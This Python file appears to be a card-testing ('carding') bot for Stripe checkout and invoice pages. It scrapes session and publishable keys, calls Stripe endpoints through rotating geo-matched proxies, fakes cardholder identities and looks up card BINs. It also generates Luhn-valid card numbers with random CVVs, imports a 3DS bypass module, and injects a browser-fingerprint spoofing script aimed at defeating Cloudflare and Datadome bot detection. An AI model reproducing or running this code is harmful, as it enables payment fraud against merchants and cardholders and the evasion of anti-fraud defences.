import re
import json
import time
import random
import asyncio
import requests
import aiohttp
from datetime import datetime
from typing import Dict, List, Optional
from curl_cffi import requests as cffi_requests
from curl_compat import ChromeSession
from dotenv import load_dotenv
import math
import numpy as np
from scipy.interpolate import interp1d
from stripe_3ds_bypasser import Stripe3DSBypasser

load_dotenv()

# ============= CONFIGURATION =============
MAX_ATTEMPTS = 10
CONCURRENT_BATCH_SIZE = 10  # Worker pool size
BATCH_DELAY = 5

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
]

STRIPE_DECLINE_CODES = {
    "generic_decline": "Card declined by issuer",
    "incorrect_cvv": "CVV verification failed",
    "insufficient_funds": "Insufficient funds",
    "expired_card": "Card has expired",
    "incorrect_number": "Invalid card number",
    "invalid_cvc": "Invalid security code",
    "do_not_honor": "Transaction declined by bank",
    "fraudulent": "Fraud detection triggered",
    "lost_card": "Card reported lost",
    "stolen_card": "Card reported stolen",
    "processing_error": "Processor error",
    "authentication_required": "3DS required",
    "card_declined": "Card declined",
    "rate_limit": "Too many attempts - Slow down",
    "transaction_not_allowed": "Transaction not allowed"
}

# ============= STRIPE API EXTRACTOR =============

class StripeAPIExtractor:
    @staticmethod
    def extract_cs_live(url: str, html: str) -> Optional[str]:
        patterns = [r'/c/pay/(cs_[a-z]+_[a-zA-Z0-9]+)', r'/payment_pages/(cs_[a-z]+_[a-zA-Z0-9]+)', r'cs_[a-z]+_[a-zA-Z0-9]+']
        for pattern in patterns:
            match = re.search(pattern, url)
            if match: return match.group(1) if '(' in pattern else match.group(0)
        match = re.search(r'cs_[a-z]+_[a-zA-Z0-9]+', html)
        return match.group(0) if match else None
    
    @staticmethod
    def extract_pk_live(html: str) -> Optional[str]:
        patterns = [r'pk_[a-z]+_[a-zA-Z0-9]+', r'"publishableKey":"(pk_[a-z]+_[a-zA-Z0-9]+)"', r'data-stripe-publishable-key="(pk_[a-z]+_[a-zA-Z0-9]+)"']
        for pattern in patterns:
            match = re.search(pattern, html)
            if match: return match.group(1) if '(' in pattern else match.group(0)
        return None

    @staticmethod
    def extract_details_from_url_hash(url_str: str) -> dict:
        res = {'pk_key': None, 'stripe_account': None}
        if not url_str or '#' not in url_str:
            return res
        try:
            import urllib.parse, base64, json
            hash_str = url_str.split('#')[1]
            decoded = urllib.parse.unquote(hash_str)
            raw_bytes = base64.b64decode(decoded + '==')
            json_str = ''.join(chr(b ^ 5) for b in raw_bytes)
            data = json.loads(json_str)
            res['pk_key'] = data.get('apiKey')
            res['stripe_account'] = data.get('stripeAccount')
        except Exception:
            pass
        return res
    
    @staticmethod
    async def fetch_payment_data(user_id: int, cs_live: str, pk_live: str, stripe_account: Optional[str] = None) -> Dict:
        try:
            url = f"https://api.stripe.com/v1/payment_pages/{cs_live}/init"
            headers = {"authority": "api.stripe.com", "accept": "application/json", "content-type": "application/x-www-form-urlencoded", "user-agent": random.choice(USER_AGENTS)}
            if stripe_account:
                headers["Stripe-Account"] = stripe_account
            data = {"key": pk_live, "eid": "NA", "browser_locale": "en-US", "browser_timezone": "America/New_York", "redirect_type": "url"}
            proxy_data = await ProxyManager.get_random(user_id)
            proxies = None
            if proxy_data:
                auth = f"{proxy_data['username']}:{proxy_data['password']}@" if proxy_data.get('username') else ""
                server = proxy_data['server']
                scheme = server.split('://')[0] if '://' in server else 'http'
                server_host = server.split('://')[-1]
                proxy_url = f"{scheme}://{auth}{server_host}"

                proxies = {"http": proxy_url, "https": proxy_url}
                
            loop = asyncio.get_running_loop()
            response = await loop.run_in_executor(None, lambda: cffi_requests.post(url, headers=headers, data=data, proxies=proxies, timeout=5, impersonate="chrome120"))
            if response.status_code == 200:
                resp_json = response.json()
                amount = None
                merchant = "Unknown"
                
                # Prioritize invoice and total_summary for subscriptions and adaptive local currency pricing
                invoice = resp_json.get('invoice')
                if isinstance(invoice, dict):
                    if invoice.get('amount_due') is not None:
                        amount = invoice['amount_due']
                    elif invoice.get('total') is not None:
                        amount = invoice['total']
                
                if amount is None:
                    ts = resp_json.get('total_summary')
                    if isinstance(ts, dict):
                        if ts.get('due') is not None:
                            amount = ts['due']
                        elif ts.get('total') is not None:
                            amount = ts['total']
                            
                if amount is None:
                    lig = resp_json.get('line_item_group')
                    if lig and isinstance(lig, dict) and lig.get('total') is not None:
                        amount = lig['total']
                    elif resp_json.get('amount') is not None:
                        amount = resp_json['amount']
                    elif resp_json.get('payment_intent') and isinstance(resp_json.get('payment_intent'), dict) and resp_json['payment_intent'].get('amount') is not None:
                        amount = resp_json['payment_intent']['amount']
                    else:
                        def _find_amount(d):
                            if isinstance(d, dict):
                                for k in ['amount_total', 'amount_due']:
                                    if k in d and isinstance(d[k], int): return d[k]
                                for v in d.values():
                                    res = _find_amount(v)
                                    if res is not None: return res
                            elif isinstance(d, list):
                                for item in d:
                                    res = _find_amount(item)
                                    if res is not None: return res
                            return None
                        amount = _find_amount(resp_json)
                    
                site_domain = None
                acct = resp_json.get('account_settings')
                if acct and isinstance(acct, dict):
                    if acct.get('display_name'):
                        merchant = acct['display_name']
                    burl = acct.get('business_url') or resp_json.get('management_url') or resp_json.get('business_url')
                    if burl:
                        try:
                            import urllib.parse
                            site_domain = urllib.parse.urlparse(burl).netloc or burl
                        except Exception:
                            site_domain = burl
                elif resp_json.get('statement_descriptor'):
                    merchant = resp_json['statement_descriptor']
                    
                currency = resp_json.get('currency', 'usd').upper()


                
                locked_email = None
                if resp_json.get('customer_email'): locked_email = resp_json['customer_email']
                elif resp_json.get('prefilled_email'): locked_email = resp_json['prefilled_email']
                elif resp_json.get('email'): locked_email = resp_json['email']
                elif isinstance(resp_json.get('customer'), dict) and resp_json['customer'].get('email'): locked_email = resp_json['customer']['email']
                elif isinstance(resp_json.get('customer_details'), dict) and resp_json['customer_details'].get('email'): locked_email = resp_json['customer_details']['email']
                
                tax_country = None
                tax_zip = None
                if resp_json.get('tax_context') and resp_json['tax_context'].get('customer_tax_country'):
                    tax_country = resp_json['tax_context']['customer_tax_country']
                elif isinstance(resp_json.get('customer'), dict) and resp_json['customer'].get('address') and resp_json['customer']['address'].get('country'):
                    tax_country = resp_json['customer']['address']['country']
                    tax_zip = resp_json['customer']['address'].get('postal_code')
                
                return {'success': True, 'amount': f"{currency} {amount/100:.2f}" if amount is not None else None, 'raw_amount': amount, 'merchant': merchant, 'site_domain': site_domain, 'locked_email': locked_email, 'tax_country': tax_country, 'tax_zip': tax_zip, 'init_checksum': resp_json.get('init_checksum'), 'init_json': resp_json}
            
            try:
                err_msg = response.json().get('error', {}).get('message', f'Status {response.status_code}')
            except:
                err_msg = f'Status {response.status_code}'
            return {'success': False, 'error': err_msg}
        except Exception as e:
            return {'success': False, 'error': f"Connection failed: {str(e)}"}

    @staticmethod
    async def fetch_invoice_data(user_id: int, url: str) -> Dict:
        try:
            import urllib.parse
            parsed = urllib.parse.urlparse(url)
            path_parts = [p for p in parsed.path.split('/') if p]
            if len(path_parts) < 3 or path_parts[0] != 'i':
                return {'success': False, 'error': 'Invalid invoice URL format'}
            
            merchant_token = path_parts[1]
            invoice_secret = path_parts[2]
            
            proxy_data = await ProxyManager.get_random(user_id)
            proxies = None
            if proxy_data:
                auth = f"{proxy_data['username']}:{proxy_data['password']}@" if proxy_data.get('username') else ""
                server = proxy_data['server']
                scheme = server.split('://')[0] if '://' in server else 'http'
                server_host = server.split('://')[-1]
                proxy_url = f"{scheme}://{auth}{server_host}"

                proxies = {"http": proxy_url, "https": proxy_url}
                
            invoicedata_url = f"https://invoicedata.stripe.com/hosted_invoice_page/{merchant_token}/{invoice_secret}"
            
            headers = {
                "accept": "application/json",
                "origin": "https://invoice.stripe.com",
                "referer": "https://invoice.stripe.com/",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
            }
            
            loop = asyncio.get_running_loop()
            resp = await loop.run_in_executor(None, lambda: cffi_requests.get(invoicedata_url, headers=headers, proxies=proxies, timeout=10, impersonate="chrome120"))
            if resp.status_code != 200:
                return {'success': False, 'error': f'Failed invoicedata check: {resp.status_code}'}
                
            res_json = resp.json()
            pk_key = res_json.get('publishable_key')
            ek = res_json.get('ephemeral_key')
            invoice_id = res_json.get('invoice_id')
            
            if not pk_key or not ek or not invoice_id:
                return {'success': False, 'error': 'Missing elements in invoicedata response'}
                
            hosted_url = f"https://api.stripe.com/v1/invoices/{invoice_id}/hosted"
            hosted_headers = {
                "accept": "application/json",
                "authorization": f"Bearer {ek}",
                "stripe-version": "2020-03-02",
                "user-agent": headers["user-agent"]
            }
            
            hosted_resp = await loop.run_in_executor(None, lambda: cffi_requests.get(hosted_url, headers=hosted_headers, proxies=proxies, timeout=10, impersonate="chrome120"))
            if hosted_resp.status_code != 200:
                return {'success': False, 'error': f'Failed invoices/hosted check: {hosted_resp.status_code}'}
                
            hosted_json = hosted_resp.json()
            pi = hosted_json.get('payment_intent')
            pi_cs = None
            if isinstance(pi, dict):
                pi_cs = pi.get('client_secret')
                
            if not pi_cs:
                return {'success': False, 'error': 'No active payment intent found on invoice'}
                
            amount = hosted_json.get('amount_due') or hosted_json.get('total')
            currency = hosted_json.get('currency', 'usd').upper()
            merchant = "Unknown"
            acct = res_json.get('merchant')
            if acct and isinstance(acct, dict) and acct.get('business_name'):
                merchant = acct['business_name']
                
            locked_email = hosted_json.get('customer_email') or res_json.get('prefilled_email')
            
            return {
                'success': True,
                'cs_token': pi_cs,
                'pk_key': pk_key,
                'amount': f"{currency} {amount/100:.2f}" if amount is not None else None,
                'raw_amount': amount,
                'merchant': merchant,
                'locked_email': locked_email
            }
        except Exception as e:
            return {'success': False, 'error': str(e)}


# ============= BASE AUTOFILL =============
class ProxyManager:
    db_pool = None
    _in_memory_pools: Dict[int, List[Dict]] = {}

    @classmethod
    async def init_db(cls, db_pool):
        cls.db_pool = db_pool
        # Pre-load all user proxies from DB into memory cache
        if db_pool:
            try:
                async with db_pool.acquire() as conn:
                    rows = await conn.fetch("SELECT user_id, proxies FROM user_proxies")
                    for row in rows:
                        if row['proxies']:
                            cls._in_memory_pools[row['user_id']] = json.loads(row['proxies'])
            except Exception as e:
                print(f"ProxyManager DB prefetch warning: {e}")

    @classmethod
    async def get_user_proxies(cls, user_id: int) -> List[Dict]:
        if cls.db_pool:
            try:
                async with cls.db_pool.acquire() as conn:
                    row = await conn.fetchrow("SELECT proxies FROM user_proxies WHERE user_id = $1", user_id)
                    if row and row['proxies']:
                        parsed = json.loads(row['proxies'])
                        cls._in_memory_pools[user_id] = parsed
                        return parsed
            except Exception:
                pass
        return cls._in_memory_pools.get(user_id, [])

    @classmethod
    async def get_all_users(cls) -> List[int]:
        users = set(cls._in_memory_pools.keys())
        if cls.db_pool:
            try:
                async with cls.db_pool.acquire() as conn:
                    rows = await conn.fetch("SELECT user_id FROM user_proxies")
                    for r in rows:
                        users.add(r['user_id'])
            except Exception:
                pass
        return list(users)

    @classmethod
    async def save_user_proxies(cls, user_id: int, proxies: List[Dict]):
        cls._in_memory_pools[user_id] = proxies
        if cls.db_pool:
            try:
                async with cls.db_pool.acquire() as conn:
                    await conn.execute("""
                        INSERT INTO user_proxies (user_id, proxies)
                        VALUES ($1, $2)
                        ON CONFLICT (user_id) DO UPDATE SET proxies = EXCLUDED.proxies
                    """, user_id, json.dumps(proxies))
            except Exception as e:
                print(f"ProxyManager save DB error: {e}")

    @classmethod
    async def load(cls, user_id: int, raw_text: str) -> int:
        pool = await cls.get_user_proxies(user_id)
            
        lines = [line.strip() for line in raw_text.split('\n') if line.strip()]
        added = 0
        for line in lines:
            prefix = "http://"
            raw_line = line
            if line.lower().startswith("socks5://"):
                prefix = "socks5://"
                line = line[9:]
            elif line.lower().startswith("socks4://"):
                prefix = "socks4://"
                line = line[9:]
            elif line.lower().startswith("http://"):
                prefix = "http://"
                line = line[7:]
            elif line.lower().startswith("https://"):
                prefix = "http://"
                line = line[8:]
                
            parts = line.split(':')
            if len(parts) == 4:
                # Check if format is user:pass:ip:port or ip:port:user:pass
                if parts[1].isdigit():  # ip:port:user:pass
                    p = {"raw": raw_line, "server": f"{prefix}{parts[0]}:{parts[1]}", "username": parts[2], "password": parts[3]}
                elif parts[3].isdigit():  # user:pass:ip:port
                    p = {"raw": raw_line, "server": f"{prefix}{parts[2]}:{parts[3]}", "username": parts[0], "password": parts[1]}
                else:
                    # Fallback to standard ip:port:user:pass
                    p = {"raw": raw_line, "server": f"{prefix}{parts[0]}:{parts[1]}", "username": parts[2], "password": parts[3]}
                pool.append(p)
                added += 1
            elif len(parts) == 2:
                p = {"raw": raw_line, "server": f"{prefix}{parts[0]}:{parts[1]}"}
                pool.append(p)
                added += 1
        if added > 0:
            await cls.save_user_proxies(user_id, pool)
        return added

    @classmethod
    async def get_random(cls, user_id: int) -> Optional[Dict]:
        pool = await cls.get_user_proxies(user_id)
        if not pool:
            return None
        return random.choice(pool)
        
    @classmethod
    async def remove(cls, user_id: int, proxy_raw: str):
        pool = await cls.get_user_proxies(user_id)
        new_pool = [p for p in pool if p['raw'] != proxy_raw]
        if len(new_pool) != len(pool):
            await cls.save_user_proxies(user_id, new_pool)
        
    @classmethod
    async def clear(cls, user_id: int):
        await cls.save_user_proxies(user_id, [])

    @classmethod
    async def get_count(cls, user_id: int) -> int:
        pool = await cls.get_user_proxies(user_id)
        return len(pool)
        
    @classmethod
    async def has_proxies(cls, user_id: int) -> bool:
        return await cls.get_count(user_id) > 0

    _geo_cache: Dict[str, str] = {}

    @classmethod
    async def get_geo_matched(cls, user_id: int, target_country: str) -> Optional[Dict]:
        """Select a proxy matching the card's issuing country. Falls back to random."""
        if not target_country:
            return await cls.get_random(user_id)
        target = target_country.upper()
        pool = await cls.get_user_proxies(user_id)
        if not pool:
            return None
        matches = [p for p in pool if cls._geo_cache.get(p.get('server', ''), '').upper() == target]
        if matches:
            return random.choice(matches)
        uncached = [p for p in pool if p.get('server', '') not in cls._geo_cache]
        random.shuffle(uncached)
        for proxy in uncached[:3]:
            try:
                auth_str = f"{proxy['username']}:{proxy['password']}@" if proxy.get('username') else ""
                purl = f"http://{auth_str}{proxy['server'].replace('http://', '')}"
                async with aiohttp.ClientSession() as sess:
                    async with sess.get("http://ip-api.com/json/", proxy=purl, timeout=aiohttp.ClientTimeout(total=3)) as resp:
                        if resp.status == 200:
                            data = await resp.json()
                            cc = (data.get('countryCode') or '').upper()
                            cls._geo_cache[proxy.get('server', '')] = cc
                            if cc == target:
                                return proxy
            except:
                pass
        return random.choice(pool)

    @classmethod
    def format_for_playwright(cls, proxy_data: Dict) -> Dict:
        playwright_proxy = {"server": proxy_data["server"]}
        if "username" in proxy_data:
            playwright_proxy["username"] = proxy_data["username"]
            playwright_proxy["password"] = proxy_data["password"]
        return playwright_proxy

# ============= RANDOM DATA =============
class RandomData:
    FIRST_NAMES = ["James","John","Robert","Michael","William","David","Richard","Joseph","Thomas","Charles",
                   "Mary","Patricia","Jennifer","Linda","Elizabeth","Barbara","Susan","Jessica","Sarah","Karen"]
    LAST_NAMES = ["Smith","Johnson","Williams","Brown","Jones","Garcia","Miller","Davis","Rodriguez","Martinez"]
    STREETS = ["Main St","Oak Ave","Maple Rd","Pine Ln","Cedar Dr","Elm St","Washington Blvd","Lake Shore Dr"]
    CITIES = ["New York","Los Angeles","Chicago","Houston","Phoenix","Philadelphia","San Antonio","San Diego"]
    STATES = ["CA","NY","TX","FL","IL","PA","OH","GA","NC","MI"]
    ZIP_CODES = ["10001","90210","60601","77001","85001","19101","78201","92101"]
    
    @staticmethod
    def get_name(): return f"{random.choice(RandomData.FIRST_NAMES)} {random.choice(RandomData.LAST_NAMES)}"
    @staticmethod
    def get_email(): return f"dlx{random.randint(1000,99999)}@{random.choice(['gmail.com','yahoo.com','outlook.com'])}"
    @staticmethod
    def get_phone(): return f"+1{random.randint(200,999)}{random.randint(200,999)}{random.randint(1000,9999)}"
    _geo_cache = {}

    @staticmethod
    async def get_address_and_timezone(proxy_url: Optional[str] = None):
        if proxy_url and proxy_url in RandomData._geo_cache:
            return RandomData._geo_cache[proxy_url]

        timezone_id = 'America/New_York'
        # Coherent US address tuples — city/state/zip must MATCH or Stripe's
        # automatic tax rejects the location (customer_tax_location_invalid)
        US_PLACES = [
            ("New York", "NY", "10001"), ("Los Angeles", "CA", "90001"),
            ("Chicago", "IL", "60601"), ("Houston", "TX", "77001"),
            ("Phoenix", "AZ", "85001"), ("Philadelphia", "PA", "19101"),
            ("San Antonio", "TX", "78201"), ("San Diego", "CA", "92101"),
            ("Dallas", "TX", "75201"), ("Austin", "TX", "73301"),
            ("Seattle", "WA", "98101"), ("Miami", "FL", "33101"),
            ("Boston", "MA", "02108"), ("Atlanta", "GA", "30301"),
            ("Denver", "CO", "80014"), ("Nashville", "TN", "37201"),
            ("Portland", "OR", "97201"), ("Detroit", "MI", "48201"),
        ]
        _city, _state, _zip = random.choice(US_PLACES)
        address = {"line1": f"{random.randint(100,9999)} {random.choice(RandomData.STREETS)}",
                "city": _city,
                "state": _state,
                "zip": _zip,
                "country": "US"}
                
        # Map country to locale
        locales = {
            "US": "en-US", "GB": "en-GB", "CA": "en-CA", "AU": "en-AU", 
            "FR": "fr-FR", "DE": "de-DE", "ES": "es-ES", "IT": "it-IT",
            "JP": "ja-JP", "BR": "pt-BR", "MX": "es-MX", "IN": "en-IN",
            "NL": "nl-NL", "RU": "ru-RU", "KR": "ko-KR", "CN": "zh-CN",
            "SE": "sv-SE", "TR": "tr-TR", "ZA": "en-ZA", "SG": "en-SG"
        }
        
        if proxy_url:
            try:
                # Use a fast, free geolocation API through the proxy to find its exact physical timezone
                async with aiohttp.ClientSession() as session:
                    async with session.get("http://ip-api.com/json/", proxy=proxy_url, timeout=aiohttp.ClientTimeout(total=3)) as resp:
                        if resp.status == 200:
                            data = await resp.json()
                            if data.get("timezone"):
                                timezone_id = data["timezone"]
                            new_country = data.get("countryCode")
                            if new_country:
                                fallback_addresses = {
                                    "US": {"zip": "10001", "city": "New York", "state": "NY"},
                                    "GB": {"zip": "SW1A 1AA", "city": "London", "state": "London"},
                                    "CA": {"zip": "M5V 2L7", "city": "Toronto", "state": "ON"},
                                    "AU": {"zip": "2000", "city": "Sydney", "state": "NSW"},
                                    "FR": {"zip": "75001", "city": "Paris", "state": "Paris"},
                                    "DE": {"zip": "10115", "city": "Berlin", "state": "Berlin"},
                                    "IT": {"zip": "00118", "city": "Roma", "state": "RM"},
                                    "ES": {"zip": "28001", "city": "Madrid", "state": "Madrid"},
                                    "BR": {"zip": "01000-000", "city": "Sao Paulo", "state": "SP"},
                                    "MX": {"zip": "06000", "city": "Ciudad de Mexico", "state": "DF"},
                                    "IN": {"zip": "110001", "city": "New Delhi", "state": "Delhi"},
                                    "JP": {"zip": "100-0001", "city": "Chiyoda-ku", "state": "Tokyo"},
                                    "SG": {"zip": "018956", "city": "Singapore", "state": "Singapore"},
                                    "AE": {"zip": "00000", "city": "Dubai", "state": "Dubai"},
                                    "CH": {"zip": "1000", "city": "Lausanne", "state": "VD"},
                                    "NL": {"zip": "1011 AB", "city": "Amsterdam", "state": "North Holland"},
                                    "SE": {"zip": "111 22", "city": "Stockholm", "state": "Stockholm"},
                                    "NO": {"zip": "0150", "city": "Oslo", "state": "Oslo"},
                                    "DK": {"zip": "1000", "city": "Kobenhavn", "state": "Kobenhavn"},
                                    "FI": {"zip": "00100", "city": "Helsinki", "state": "Uusimaa"},
                                    "AT": {"zip": "1010", "city": "Wien", "state": "Wien"},
                                    "BE": {"zip": "1000", "city": "Bruxelles", "state": "Bruxelles"},
                                    "PT": {"zip": "1000-001", "city": "Lisboa", "state": "Lisboa"},
                                    "NZ": {"zip": "1010", "city": "Auckland", "state": "Auckland"},
                                    "TW": {"zip": "100", "city": "Taipei", "state": "Taipei"},
                                    "HK": {"zip": "000000", "city": "Hong Kong", "state": "Hong Kong"},
                                    "MY": {"zip": "50000", "city": "Kuala Lumpur", "state": "Kuala Lumpur"},
                                    "TH": {"zip": "10100", "city": "Bangkok", "state": "Bangkok"},
                                    "VN": {"zip": "70000", "city": "Ho Chi Minh City", "state": "Ho Chi Minh City"},
                                    "PH": {"zip": "1000", "city": "Manila", "state": "Metro Manila"},
                                    "ID": {"zip": "10110", "city": "Jakarta", "state": "DKI Jakarta"},
                                    "KR": {"zip": "01000", "city": "Seoul", "state": "Seoul"}
                                }
                                
                                if new_country in fallback_addresses:
                                    addr_data = fallback_addresses[new_country]
                                    address["country"] = new_country
                                    address["zip"] = addr_data["zip"]
                                    address["city"] = addr_data["city"]
                                    address["state"] = addr_data["state"]
            except: pass
            
        locale = locales.get(address["country"], "en-US")
        result_tuple = (address, timezone_id, locale)
        if proxy_url:
            RandomData._geo_cache[proxy_url] = result_tuple
            
        return result_tuple

# ============= BIN LOOKUP =============
class BINLookup:
    """Free BIN database lookup with in-memory caching"""
    _cache: Dict[str, Dict] = {}

    @classmethod
    async def lookup(cls, card_number: str) -> Dict:
        bin6 = card_number[:6]
        if bin6 in cls._cache:
            return cls._cache[bin6]
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(f"https://bins.antipublic.cc/bins/{bin6}", timeout=aiohttp.ClientTimeout(total=5)) as resp:
                    if resp.status == 200:
                        data = await resp.json()
                        result = {
                            'country': (data.get('countrycode') or '').upper(),
                            'country_name': data.get('country', ''),
                            'bank': data.get('bank', ''),
                            'brand': data.get('brand', ''),
                            'type': data.get('type', ''),
                            'level': data.get('level', '')
                        }
                        cls._cache[bin6] = result
                        return result
        except Exception:
            pass
        fallback = {'country': '', 'country_name': '', 'bank': '', 'brand': '', 'type': '', 'level': ''}
        cls._cache[bin6] = fallback
        return fallback

# ============= CARD GENERATOR =============
class CardGenerator:
    @staticmethod
    def luhn(card: str) -> int:
        def digits_of(n): return [int(d) for d in str(n)]
        digits = digits_of(card)
        odd_digits = digits[-1::-2]
        even_digits = digits[-2::-2]
        checksum = sum(odd_digits)
        for d in even_digits:
            checksum += sum(digits_of(d*2))
        return checksum % 10
    
    @staticmethod
    def generate(bin_pattern: str) -> Optional[Dict]:
        if not bin_pattern: return None
        parts = bin_pattern.split('|')
        bin_clean = re.sub(r'[^0-9xX]','',parts[0])
        is_amex = bin_clean.startswith(('34','37'))
        target_len = 15 if is_amex else 16
        cvv_len = 4 if is_amex else 3
        card = ''
        for c in bin_clean:
            card += str(random.randint(0,9)) if c.lower()=='x' else c
        if len(card) >= target_len:
            card = card[:target_len - 1]
        remaining = target_len - len(card) - 1
        if remaining > 0:
            for _ in range(remaining): card += str(random.randint(0,9))
        for i in range(10):
            if CardGenerator.luhn(card+str(i))==0:
                full_card = card+str(i)
                break
        else: full_card = card+'0'
        if len(full_card) != target_len: full_card = full_card[:target_len]
        _mm_raw = parts[1] if len(parts) > 1 else ''
        _yy_raw = parts[2] if len(parts) > 2 else ''
        _cv_raw = parts[3] if len(parts) > 3 else ''
        month = _mm_raw.zfill(2) if _mm_raw and _mm_raw.lower() not in ('xx', '') else f"{random.randint(1,12):02d}"
        year  = _yy_raw.zfill(2) if _yy_raw and _yy_raw.lower() not in ('xx', '') else f"{(datetime.now().year+random.randint(1,5)) % 100:02d}"
        if is_amex and _cv_raw and len(_cv_raw) < 4:
            cvv = _cv_raw + str(random.randint(0,9))
        else:
            cvv = _cv_raw if _cv_raw and _cv_raw.lower() not in ('xxx','xxxx','') else ''.join(str(random.randint(0,9)) for _ in range(cvv_len))
        return {'card':full_card, 'month':month, 'year':year, 'cvv':cvv}



# ============= AUTOFILL ENGINES =============
HARDWARE_SPOOF_SCRIPT = """
    Object.defineProperty(navigator,'webdriver',{get:()=>undefined});
    window.chrome={runtime:{}};
    
    // Emulate Hardware Capabilities
    const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
    Object.defineProperty(navigator, 'hardwareConcurrency', { get: () => 8 });
    Object.defineProperty(navigator, 'deviceMemory', { get: () => 8 });
    Object.defineProperty(navigator, 'maxTouchPoints', { get: () => isMobile ? 5 : 0 });
    
    // Emulate Battery
    if (isMobile && navigator.getBattery) {
        navigator.getBattery = async () => ({
            charging: false,
            chargingTime: Infinity,
            dischargingTime: 8400,
            level: 0.85 + (Math.random() * 0.1),
            addEventListener: () => {}
        });
    }
    
    // Emulate Gyroscope/Accelerometer permission if mobile
    if (isMobile) {
        if (navigator.permissions && navigator.permissions.query) {
            navigator.permissions.query = new Proxy(navigator.permissions.query, {
                apply: async (target, thisArg, args) => {
                    if (args[0].name === 'accelerometer' || args[0].name === 'gyroscope') {
                        return { state: 'granted', onchange: null };
                    }
                    return Reflect.apply(target, thisArg, args);
                }
            });
        }
        navigator.vibrate = (pattern) => true;
        setInterval(() => {
            try {
                const motionEvent = new Event('devicemotion');
                motionEvent.acceleration = { x: Math.random() * 0.01, y: Math.random() * 0.01, z: 9.81 + (Math.random() * 0.01) };
                motionEvent.rotationRate = { alpha: Math.random() * 0.1, beta: Math.random() * 0.1, gamma: Math.random() * 0.1 };
                window.dispatchEvent(motionEvent);
            } catch(e) {}
        }, 50);
    }
    
    // Respect host viewport/screen bounds while standardizing depth
    const defaultDepth = isMobile ? 24 : 32;
    Object.defineProperty(window.screen, 'colorDepth', { get: () => window.screen.colorDepth || defaultDepth });
    Object.defineProperty(window.screen, 'pixelDepth', { get: () => window.screen.pixelDepth || defaultDepth });
    
    // Block WebRTC IP Leaks (Silent Bypass)
    Object.defineProperty(navigator, 'mediaDevices', { value: undefined, configurable: false, writable: false });
    const FakeRTC = function() {
        this.createDataChannel = () => ({});
        this.createOffer = () => Promise.resolve({ sdp: '', type: 'offer' });
        this.setLocalDescription = () => Promise.resolve();
        this.close = () => {};
        this.addEventListener = () => {};
        this.localDescription = { sdp: '' };
        this.iceConnectionState = 'new';
    };
    window.RTCPeerConnection = FakeRTC;
    window.webkitRTCPeerConnection = FakeRTC;
    
    // Canvas Fingerprint Poisoning (Cloudflare/Datadome bypass)
    const originalGetContext = HTMLCanvasElement.prototype.getContext;
    HTMLCanvasElement.prototype.getContext = function(type, ...args) {
        const context = originalGetContext.apply(this, [type, ...args]);
        if (type === '2d') {
            const originalFillText = context.fillText;
            context.fillText = function(...args) {
                args[1] += (Math.random() - 0.5) * 0.02; // Subpixel noise
                return originalFillText.apply(this, args);
            };
            const originalGetImageData = context.getImageData;
            context.getImageData = function(...args) {
                const imageData = originalGetImageData.apply(this, args);
                // Math noise on 5 random pixels completely mutates SHA-256 fingerprint hash
                for(let i=0; i<5; i++) {
                    const idx = Math.floor(Math.random() * (imageData.data.length / 4)) * 4;
                    imageData.data[idx] = (imageData.data[idx] + 1) % 255;
                }
                return imageData;
            };
            
            // Font Metric Poisoning (measureText)
            // Bots measure text width to the thousandth decimal to fingerprint OS font smoothing engines.
            // We inject 0.0001% variance to spoof a unique subpixel rendering engine.
            const originalMeasureText = context.measureText;
            context.measureText = function(...args) {
                const metrics = originalMeasureText.apply(this, args);
                if (metrics && metrics.width) {
                    Object.defineProperty(metrics, 'width', {
                        value: metrics.width + (Math.random() - 0.5) * 0.001,
                        configurable: true
                    });
                }
                return metrics;
            };
        }
        return context;
    };
    
    // DOM ClientRect GPU Fractional Anti-Aliasing Spoofing
    // Headless browsers return perfectly round integers (e.g. 50.000) for element positions.
    // Real GPUs render with fractional anti-aliasing (e.g. 50.012). We inject this variance.
    const originalGetBoundingClientRect = Element.prototype.getBoundingClientRect;
    Element.prototype.getBoundingClientRect = function() {
        const rect = originalGetBoundingClientRect.apply(this);
        if(!rect) return rect;
        const randomize = (val) => val + (Math.random() - 0.5) * 0.005;
        return {
            x: randomize(rect.x),
            y: randomize(rect.y),
            width: randomize(rect.width),
            height: randomize(rect.height),
            top: randomize(rect.top),
            right: randomize(rect.right),
            bottom: randomize(rect.bottom),
            left: randomize(rect.left)
        };
    };
    
    // WebGL GPU Vendor & Renderer Spoofing
    const getParameterProxy = function (original) {
        return function (parameter) {
            // UNMASKED_VENDOR_WEBGL = 37445
            if (parameter === 37445) {
                return 'Qualcomm'; // Mobile GPU Vendor
            }
            // UNMASKED_RENDERER_WEBGL = 37446
            if (parameter === 37446) {
                return 'Adreno (TM) 740'; // Samsung Galaxy S23 Ultra GPU
            }
            return original.apply(this, [parameter]);
        };
    };
    const webgl1 = WebGLRenderingContext.prototype.getParameter;
    WebGLRenderingContext.prototype.getParameter = getParameterProxy(webgl1);
    const webgl2 = WebGL2RenderingContext.prototype.getParameter;
    WebGL2RenderingContext.prototype.getParameter = getParameterProxy(webgl2);
    
    // Audio Fingerprint Poisoning (Datadome hardware unmasking bypass)
    const audioMethods = ['createOscillator', 'createDynamicsCompressor', 'createBiquadFilter'];
    const fakeAudioContext = function(TargetContext) {
        if (!TargetContext) return;
        audioMethods.forEach(method => {
            if (TargetContext.prototype[method]) {
                const originalMethod = TargetContext.prototype[method];
                TargetContext.prototype[method] = function(...args) {
                    const node = originalMethod.apply(this, args);
                    if (method === 'createOscillator') {
                        node.type = 'triangle'; // Poison the wave shape
                        const originalStart = node.start;
                        node.start = function(...sArgs) {
                            // Introduce random frequency variance (+/- 0.05 Hz) to mutate audio SHA hash
                            if(this.frequency) {
                                this.frequency.value += (Math.random() - 0.5) * 0.1;
                            }
                            return originalStart.apply(this, sArgs);
                        };
                    }
                    return node;
                };
            }
        });
    };
    fakeAudioContext(window.OfflineAudioContext);
    fakeAudioContext(window.AudioContext);
    fakeAudioContext(window.webkitOfflineAudioContext);
    fakeAudioContext(window.webkitAudioContext);
"""

